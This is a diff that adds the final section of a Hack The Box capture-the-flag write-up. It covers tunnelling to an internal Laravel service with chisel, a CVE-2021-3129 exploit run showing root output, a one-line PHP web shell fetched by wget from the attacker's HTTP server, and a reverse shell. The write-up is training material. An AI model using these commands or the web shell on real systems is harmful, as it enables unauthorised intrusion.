@@ -167,3 +167,85 @@ Boom we have a port let try to port forward using `chisel` first of all we need 
 Now let start the server on our attacking machine.
 
 ```
+./chisel server -p 9000 --reverse &
+```
+
+![image](https://user-images.githubusercontent.com/69868171/148065782-0450945b-8aea-4f23-93ca-a7aec4ccd2fb.png)
+
+
+Now on the target.
+
+```
+./chisel client 10.10.14.7:9000 R:9001:127.0.0.1:8000 &
+```
+
+![image](https://user-images.githubusercontent.com/69868171/148065987-7ddf2b02-0bf1-4f37-9ac2-006da12b9c52.png)
+
+We are ready to access it now.
+
+```
+127.0.0.1:9001
+```
+
+![image](https://user-images.githubusercontent.com/69868171/148066115-698d5f6f-0194-43f2-a839-483ee9475c42.png)
+
+Boom we found a Laravel v8 (PHP v7.4.18) version seems cool let confirm if it vulnerable.
+
+![image](https://user-images.githubusercontent.com/69868171/148066426-3fe2f56c-2852-4811-93c0-ac968121204c.png)
+
+Boom jackpot let give it a shot.
+
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.105/CVE-2021-3129]
+└─$ python3 exploit.py
+[*] Try to use monolog_rce1 for exploitation.
+[*] Result:
+uid=0(root) gid=0(root) groups=0(root)
+
+[*] Try to use monolog_rce2 for exploitation.
+[*] Result:
+uid=0(root) gid=0(root) groups=0(root)
+
+[*] Try to use monolog_rce3 for exploitation.
+[*] Result:
+[-] RCE echo is not found.
+```
+
+Exploit working now let try to get a reverse shell let edit the exploit to wget our shell file to the server.
+
+```
+//Save in shell.php//
+
+<?php system ($_GET['cmd']); ?>
+```
+
+Now let start our python server.
+
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.105]
+└─$ python -m SimpleHTTPServer                       
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+![image](https://user-images.githubusercontent.com/69868171/148067410-2d46be44-92c9-41a2-a383-28f654bdba68.png)
+
+Now let save and run the exploit again.
+
+![image](https://user-images.githubusercontent.com/69868171/148067535-3b5b5bc1-2b61-4957-a7d8-bb270bf61766.png)
+
+Which confirm our file has been transfered let confirm it.
+
+![image](https://user-images.githubusercontent.com/69868171/148067657-f631d551-3c39-427b-8c78-7f3812532dbc.png)
+
+Flashy right hehehehehe let get a reverse shell back to our terminal now.
+
+![image](https://user-images.githubusercontent.com/69868171/148067929-c79d26d1-0645-4082-a0af-00ab9a96f7bf.png)
+
+Bruhhhhhhhh you just got yourself a root you are l33t and thanks for reading my writeup between peace out.
+
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
